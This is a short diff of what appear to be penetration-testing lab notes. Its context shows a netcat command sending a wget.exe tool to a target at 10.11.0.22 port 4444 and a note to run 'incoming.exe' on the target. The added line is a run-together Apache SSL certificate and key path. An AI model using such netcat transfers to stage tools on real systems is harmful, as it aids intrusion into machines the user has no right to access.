@@ -35,3 +35,6 @@ nc -nv 10.11.0.22 4444 < /user/share/.../wget.exe
 
 //on target but first abort nc
 incoming.exe -v
+
+
+/etc/apache2/ssl/apache.crtSSLCertificateKeyFile /etc/apache2/ssl/apache.key
